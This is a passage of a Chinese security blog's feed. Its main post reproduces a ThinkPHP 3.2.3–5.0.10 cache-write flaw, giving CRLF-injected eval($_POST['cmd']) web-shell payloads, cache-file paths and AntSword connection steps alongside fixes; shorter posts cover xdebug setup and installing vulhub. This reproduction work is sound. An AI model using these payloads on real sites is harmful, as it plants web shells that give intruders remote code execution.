    <link href="http://h3art3ars.github.io/2019/12/16/Thinkphp3-2-3-5-0-10%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/"/>
    <id>http://h3art3ars.github.io/2019/12/16/Thinkphp3-2-3-5-0-10%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/</id>
    <published>2019-12-16T11:04:10.000Z</published>
    <updated>2019-12-17T03:27:11.140Z</updated>
    
    <content type="html"><![CDATA[<h1 id="phpthink3-2-3-5-0-10缓存函数缺陷"><a href="#phpthink3-2-3-5-0-10缓存函数缺陷" class="headerlink" title="phpthink3.2.3-5.0.10缓存函数缺陷"></a>phpthink3.2.3-5.0.10缓存函数缺陷</h1><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="thinkphp3-2-3"><a href="#thinkphp3-2-3" class="headerlink" title="thinkphp3.2.3"></a>thinkphp3.2.3</h3><ol><li><p>漏洞文件位置(一般审计得出)</p><p><code>http://domain/index.php/Home/Index/get?id=%0d%0aeval($_POST[&#39;cmd&#39;]);%0d%0a//</code></p></li><li><p>缓存文件为缓存名的md5值，这里采用md5（name）=b068931cc450442b63f5b3d276ea4297</p><p><code>http://domain/Application/Runtime/Temp/b068931cc450442b63f5b3d276ea4297.php</code></p></li><li><p>之后蚁剑连接。</p></li></ol><h3 id="thinkphp5-0-5"><a href="#thinkphp5-0-5" class="headerlink" title="thinkphp5.0.5"></a>thinkphp5.0.5</h3><ol><li><p>漏洞文件位置(一般审计得出)</p><p><code>http://domain/public/index.php/Home/Index/index</code></p><p>POST数据 :<code>con=%0d%0aeval($_POST[&#39;cmd&#39;]);%0d%0a//</code></p></li><li><p>缓存文件位置b0文件夹是md5(cache-name)前2位。</p><p><code>http://domain/runtime/cache/b0/b068931cc450442b63f5b3d276ea4297.php</code></p></li><li><p>蚁剑连接</p></li></ol><h2 id="局限性"><a href="#局限性" class="headerlink" title="局限性"></a>局限性</h2><ul><li>使用<code>S()</code>函数或者<code>Cache()</code>函数的位置不确定，尽量拿源码分析。</li><li>使用缓存函数的<code>name</code>变量未知，拿源码分析或尝试常用的缓存名<code>name</code>、<code>key</code></li></ul><h2 id="3-2-3漏洞复现"><a href="#3-2-3漏洞复现" class="headerlink" title="3.2.3漏洞复现"></a>3.2.3漏洞复现</h2><ul><li><p>直接跟进到<code>/Library/Think/Cache/File.class.php</code>文件，看到set方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&#x2F;**</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">     * 写入缓存</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">     * @access public</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">     * @param string $name 缓存变量名</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">     * @param mixed $value  存储数据</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">     * @param int $expire  有效时间 0为永久</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">     * @return boolean</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">     *&#x2F;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">    public function set($name,$value,$expire&#x3D;null) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">        N(&#39;cache_write&#39;,1);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">        if(is_null($expire)) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">            $expire &#x3D;  $this-&gt;options[&#39;expire&#39;];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">        $filename   &#x3D;   $this-&gt;filename($name);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">        $data   &#x3D;   serialize($value);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">        if( C(&#39;DATA_CACHE_COMPRESS&#39;) &amp;&amp; function_exists(&#39;gzcompress&#39;)) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">            &#x2F;&#x2F;数据压缩</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">            $data   &#x3D;   gzcompress($data,3);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">        if(C(&#39;DATA_CACHE_CHECK&#39;)) &#123;&#x2F;&#x2F;开启数据校验</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">            $check  &#x3D;  md5($data);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">        &#125;else &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">            $check  &#x3D;  &#39;&#39;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">        $data    &#x3D; &quot;&lt;?php\n&#x2F;&#x2F;&quot;.sprintf(&#39;%012d&#39;,$expire).$check.$data.&quot;\n?&gt;&quot;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">26</span></pre></td><td class="code"><pre><span class="line">        &#x2F;&#x2F;data参数经过序列化，直接被写到文件内。</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">27</span></pre></td><td class="code"><pre><span class="line">        </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">28</span></pre></td><td class="code"><pre><span class="line">        $result  &#x3D;   file_put_contents($filename,$data);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">29</span></pre></td><td class="code"><pre><span class="line">        if($result) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">30</span></pre></td><td class="code"><pre><span class="line">            if($this-&gt;options[&#39;length&#39;]&gt;0) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">31</span></pre></td><td class="code"><pre><span class="line">                &#x2F;&#x2F; 记录缓存队列</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">32</span></pre></td><td class="code"><pre><span class="line">                $this-&gt;queue($name);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">33</span></pre></td><td class="code"><pre><span class="line">            &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">34</span></pre></td><td class="code"><pre><span class="line">            clearstatcache();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">35</span></pre></td><td class="code"><pre><span class="line">            return true;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">36</span></pre></td><td class="code"><pre><span class="line">        &#125;else &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">37</span></pre></td><td class="code"><pre><span class="line">            return false;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">38</span></pre></td><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">39</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr></table></figure></li><li><p>写一个调用缓存函数的的方法，运行一下。看看写进去什么</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">namespace Home\Controller;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">use Think\Controller;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">class IndexController extends Controller &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">    public function index()&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">        $a&#x3D;I(&#39;post.a3&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">        S(&#39;name&#39;,$a);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure></li><li><p>在set方法下断点，访问 <code>http://localhost/index.php/Home/Index/index.html</code> ，post数据：<code>a3=aaaa</code></p><p><img src="/images/tp3%E7%BC%93%E5%AD%98-1.png" alt="debug"></p><p>可以看到$data参数经过序列化，直接写入php后缀的文件。F9运行可以看到，在<code>Application/Runtime/Temp/</code>文件夹下生成了php文件。</p><p><img src="/images/tp3%E7%BC%93%E5%AD%98-2.png" alt="cachefile"></p><p>写入到文件被行注释了。</p></li><li><p><code>$data</code>参数未过滤<code>%0d%0a</code>可以用换行来绕过行注释，尝试post数据：</p><p><code>a3=%0d%0aeval($_POST[&#39;cmd&#39;]);%0d%0a//</code></p><p><img src="/images/tp3%E7%BC%93%E5%AD%98-3.png" alt="file-cache"></p></li><li><p>之后用蚁剑连接成功</p><p><img src="/images/tp3%E7%BC%93%E5%AD%98-4.png" alt="antsword"></p></li></ul><h2 id="5-0-5漏洞复现"><a href="#5-0-5漏洞复现" class="headerlink" title="5.0.5漏洞复现"></a>5.0.5漏洞复现</h2><ul><li><p>漏洞代码与3.2.3差不多，不一样的在缓存目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">protected function getCacheKey($name)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">    &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">        $name &#x3D; md5($name);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">        if ($this-&gt;options[&#39;cache_subdir&#39;]) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">            &#x2F;&#x2F; 使用子目录</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">            $name &#x3D; substr($name, 0, 2) . DS . substr($name, 2);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">        if ($this-&gt;options[&#39;prefix&#39;]) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">            $name &#x3D; $this-&gt;options[&#39;prefix&#39;] . DS . $name;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">        $filename &#x3D; $this-&gt;options[&#39;path&#39;] . $name . &#39;.php&#39;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">        $dir      &#x3D; dirname($filename);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">        if (!is_dir($dir)) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">            mkdir($dir, 0755, true);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">        return $filename;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr></table></figure></li><li><p>在index控制器写如下代码：</p><p><img src="/images/tp3%E7%BC%93%E5%AD%98-5.png" alt="images"></p></li><li><p>之后访问 <code>http://localhost/public/index.php/Home/index</code>POST数据：<code>con=%0aeval($_POST[&#39;cmd&#39;]);%0d//</code></p></li><li><p>最终在 <code>runtime/cache/b0/68931cc450442b63f5b3d276ea4297.php</code>文件生成shell：</p><p><img src="/images/tp3%E7%BC%93%E5%AD%98-6.png" alt="image2"></p></li><li><p>之后访问蚁剑 <code>http://localhost/runtime/cache/b0/68931cc450442b63f5b3d276ea4297.php</code></p><p><img src="/images/tp3%E7%BC%93%E5%AD%98-7.png" alt="images3"></p></li></ul><h2 id="坑"><a href="#坑" class="headerlink" title="坑"></a>坑</h2><p>在复现的时候看到CMS-hunter里对这个漏洞有这个描述：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">个人在复现这个漏洞的时候发现5.0.x版本的TP并不能直接访问到缓存文件所在的目录，因此可以情况下不能触发该漏洞。在3.2.x版本是可以直接从浏览器访问到缓存文件的。</span></pre></td></tr></table></figure><p>但在个人复现的时候并没有出现这个情况。</p><p>所以说一切还是自己复现一边才能填坑</p><h2 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h2><ul><li><p>过滤换行符</p><p>在$data写入文件之前过滤</p><p><code>$data = str_replace(PHP_EOL, &#39;&#39;, $data);</code></p></li><li><p>禁止访问目录</p><p>在<code>Runtime</code>目录添加<code>.htaccess</code>文件，内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;IfModule mod_rewrite.c&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">deny from all</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">&lt;&#x2F;IfModule&gt;</span></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      think系列之 thinkphp3.2.3-thinkphp5.0.10缓存漏洞复现
    
    </summary>
    
    
      <category term="漏洞" scheme="http://h3art3ars.github.io/categories/%E6%BC%8F%E6%B4%9E/"/>
    
    
      <category term="ctf" scheme="http://h3art3ars.github.io/tags/ctf/"/>
    
      <category term="漏洞" scheme="http://h3art3ars.github.io/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="复现" scheme="http://h3art3ars.github.io/tags/%E5%A4%8D%E7%8E%B0/"/>
    
      <category term="thinkphp" scheme="http://h3art3ars.github.io/tags/thinkphp/"/>
    
  </entry>
  
  <entry>
    <title>xdebug特定环境配置</title>
    <link href="http://h3art3ars.github.io/2019/12/12/xdebug%E7%89%B9%E5%AE%9A%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
    <id>http://h3art3ars.github.io/2019/12/12/xdebug%E7%89%B9%E5%AE%9A%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</id>
    <published>2019-12-12T11:09:54.000Z</published>
    <updated>2019-12-21T13:09:00.925Z</updated>
    
    <content type="html"><![CDATA[<h2 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h2><p>chrome</p><p>phpstudy 8.0.9.3</p><ul><li>此法只适合文件在网站根目录，因此需要自己配置添加网站，将要调试的项目放在此目录</li><li>php 7.3.4</li></ul><p>phpstorm2019</p><h2 id="浏览器chrome配置"><a href="#浏览器chrome配置" class="headerlink" title="浏览器chrome配置"></a>浏览器chrome配置</h2><p>下载 Xdebug-helper</p><h2 id="phpstudy"><a href="#phpstudy" class="headerlink" title="phpstudy"></a>phpstudy</h2><ol><li><p>在此版本phpstudy中，只有php7.3.4中有php_xdebug扩展.开启此扩展。</p></li><li><p>找到对应php.ini文件。</p></li><li><p><strong>重要：搜索文件找到开启的extension项：<code>extension：php_xdebug</code> 用 <code>;</code>注释掉。因为phpstudy开启这个扩展，但需要的是<code>zend_extension</code></strong></p></li><li><p>以下内容添加到php.ini尾部</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">zend_extension&#x3D;xdebug</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">[XDebug]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">;调试功能模块儿</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">;extension&#x3D;php_xdebug.dll</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">;下面是php_xdebug在phpstudy中的位置，根据情况修改，重要！！！！</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">zend_extension &#x3D; &quot;D:\phpstudy\Extensions\php\php7.3.4nts\ext\php_xdebug.dll&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">xdebug.remote_handler&#x3D;dbgp</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">xdebug.idekey&#x3D; &quot;PHPSTORM&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">;开启远程调试</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">xdebug.remote_enable &#x3D; On</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">;远程主机</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">xdebug.remote_host&#x3D;localhost</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">;主机端口，重要！！！！</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">xdebug.remote_port&#x3D;9001</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">;开启自动跟踪</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">xdebug.auto_trace &#x3D; On</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">;开启异常跟踪</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">xdebug.show_exception_trace &#x3D; On</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">;开启远程调试自动启动</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">xdebug.remote_autostart &#x3D; On</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">;收集变量</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">xdebug.collect_vars &#x3D; On</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">;收集返回值</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">xdebug.collect_return &#x3D; On</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">;收集参数</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">26</span></pre></td><td class="code"><pre><span class="line">xdebug.collect_params &#x3D; On</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">27</span></pre></td><td class="code"><pre><span class="line">;临时跟踪信息输出，按需修改</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">28</span></pre></td><td class="code"><pre><span class="line">;xdebug.trace_output_dir&#x3D;&quot;D:\phpstudy\Extensions\php\php7.3.4nts\tmp&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">29</span></pre></td><td class="code"><pre><span class="line">;显示局部变量</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">30</span></pre></td><td class="code"><pre><span class="line">xdebug.show_local_vars &#x3D; On</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">31</span></pre></td><td class="code"><pre><span class="line">xdebug.profiler_enable &#x3D; On</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">32</span></pre></td><td class="code"><pre><span class="line">;xdebug.profiler_output_dir &#x3D;&quot;D:\phpstudy\Extensions\php\php7.3.4nts\tmp&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">33</span></pre></td><td class="code"><pre><span class="line">xdebug.trace_enable_trigger &#x3D;On</span></pre></td></tr></table></figure></li><li><p>重启apache服务</p></li></ol><h2 id="phpstorm配置"><a href="#phpstorm配置" class="headerlink" title="phpstorm配置"></a>phpstorm配置</h2><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a><strong>注意</strong></h3><p>每步配置完成后需点击右下角：<code>Apply</code>！！！</p><h3 id="php解释器配置"><a href="#php解释器配置" class="headerlink" title="php解释器配置"></a>php解释器配置</h3><p>File-&gt;Setting-&gt;Language&amp;Frameworks-&gt;PHP</p><p>php版本7.3.4。其他的正常配置解释器即可。</p><h3 id="debug配置"><a href="#debug配置" class="headerlink" title="debug配置"></a>debug配置</h3><p>File-&gt;Setting-&gt;Language&amp;Frameworks-&gt;PHP-&gt;Debug</p><p>此步只需更改<code>X-debug port</code>为9001，即第二步在php.ini中配置项为<code>xdebug.remote_port</code>的值</p><h3 id="DBGp-Proxy配置"><a href="#DBGp-Proxy配置" class="headerlink" title="DBGp Proxy配置"></a>DBGp Proxy配置</h3><p>File-&gt;SFetting-&gt;Language&amp;Frameworks-&gt;PHP-&gt;Debug-&gt;DBGp Proxy</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">IDE key:PHPSTORM</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;第二步在php.ini中配置项为xdebug.idekey的值</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">HOST:http:&#x2F;&#x2F;test.com</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;为要调试的项目配置的网站。</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;不要用类似于http:&#x2F;&#x2F;localhost&#x2F;test&#x2F;test.php</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">Port:80</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;服务器的监听地址</span></pre></td></tr></table></figure><p>File-&gt;SFetting-&gt;Language&amp;Frameworks-&gt;PHP-&gt;Server</p><ol><li>点加号添加，Name随便，下面要用。</li><li>Host填调试项目网站。eg:<a href="http://test.com" target="_blank" rel="noopener">http://test.com</a></li><li>Port:80 </li><li>Debugger:Xdebug</li></ol><h3 id="最终调试前配置"><a href="#最终调试前配置" class="headerlink" title="最终调试前配置"></a>最终调试前配置</h3><p>Run-&gt;Edit Configurations</p><ol><li>点击<code>+</code></li><li>选择Php Web Page</li><li>Name随便</li><li>Server选择上一步添加Server的Name</li><li>Start URL: <a href="http://test.com" target="_blank" rel="noopener">http://test.com</a></li><li>Browser: Chrome</li></ol><p>配置完毕</p><h3 id="食用"><a href="#食用" class="headerlink" title="食用"></a>食用</h3><p>浏览器的<code>Xdebuger helper</code>选择<code>Debug</code></p><p>phpstorm点击右上角电话图标开始监听</p><p>phpstorm点击右上角甲壳虫图标开始调试</p><p>注意不能浏览器直接访问，要点击甲壳虫图标</p><p>如果浏览器访问时，url参数含有<code>XDEBUG_SESSION_START=XXXXX</code>参数，cookie中有 <code>XDEBUG_SESSION =PHPSTORM</code>则成功</p><h3 id="后续调试超时问题"><a href="#后续调试超时问题" class="headerlink" title="后续调试超时问题"></a>后续调试超时问题</h3><p>调试时，还没调试几十秒钟就超时了。设置一下。</p><p>找到httpd.conf</p><p>查找 <code>LoadModule fcgid_module modules/mod_fcgid.so</code>模块，保证不被注释</p><p>在末尾添加以下配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;IfModule fcgid_module&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"> FcgidProcessLifeTime 8200</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"> FcgidIOTimeout 8200</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line"> FcgidConnectTimeout 4000</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line"> &lt;&#x2F;IfModule&gt;</span></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      phpstudy8.0.9(2019)+phpstorm2019+xdebug特定版本的详细配置，搭建调试环境。便于php代码的动态审计。
    
    </summary>
    
    
      <category term="tools" scheme="http://h3art3ars.github.io/categories/tools/"/>
    
    
      <category term="tools" scheme="http://h3art3ars.github.io/tags/tools/"/>
    
      <category term="php" scheme="http://h3art3ars.github.io/tags/php/"/>
    
      <category term="调试" scheme="http://h3art3ars.github.io/tags/%E8%B0%83%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>vulhub简单安装</title>
    <link href="http://h3art3ars.github.io/2019/12/11/vulhub-install/"/>
    <id>http://h3art3ars.github.io/2019/12/11/vulhub-install/</id>
    <published>2019-12-11T07:53:39.000Z</published>
    <updated>2019-12-11T07:56:22.354Z</updated>
    
    <content type="html"><![CDATA[<h1 id="vulhub-安装使用"><a href="#vulhub-安装使用" class="headerlink" title="vulhub  安装使用"></a>vulhub  安装使用</h1><h3 id="已备环境"><a href="#已备环境" class="headerlink" title="已备环境"></a>已备环境</h3><ol><li>python3</li><li>docker</li></ol><h3 id="安装其他环境"><a href="#安装其他环境" class="headerlink" title="安装其他环境"></a>安装其他环境</h3><ol><li><p>启动docker服务</p><p><code>service docker start</code></p></li><li><p>安装docker-compose</p><p><code>pip3 install docker-compose</code></p></li></ol><h3 id="下载vulhub并解压"><a href="#下载vulhub并解压" class="headerlink" title="下载vulhub并解压"></a>下载vulhub并解压</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;vulhub&#x2F;archive&#x2F;master.zip -O vulhub-master.zip</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">unzip vulhub-master.zip</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">cd vulhub-master</span></pre></td></tr></table></figure><h3 id="选择并享用"><a href="#选择并享用" class="headerlink" title="选择并享用"></a>选择并享用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">cd ****&#x2F;****</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">docker-compose build</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">docker-compose down -v</span></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      安装vulhub以用来建立docker环境供自己练习
    
    </summary>
    
    
      <category term="学习" scheme="http://h3art3ars.github.io/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="tools" scheme="http://h3art3ars.github.io/tags/tools/"/>
    
      <category term="学习" scheme="http://h3art3ars.github.io/tags/%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="漏洞利用" scheme="http://h3art3ars.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>ImageMagick</title>
    <link href="http://h3art3ars.github.io/2019/12/11/ImageMagick/"/>
    <id>http://h3art3ars.github.io/2019/12/11/ImageMagick/</id>
    <published>2019-12-11T07:46:16.000Z</published>
    <updated>2019-12-14T02:44:06.039Z</updated>
    
